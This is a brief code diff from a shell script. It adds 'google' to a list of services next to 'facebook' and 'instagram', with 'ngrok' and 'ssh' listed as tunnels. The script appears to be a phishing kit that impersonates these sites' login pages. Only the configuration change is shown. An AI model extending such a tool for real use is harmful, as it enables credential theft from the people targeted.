@@ -65,7 +65,7 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-services=("facebook" "instagram")
+services=("facebook" "instagram" "google")
 tunnels=("ngrok" "ssh")
 
 verifyLinks() {
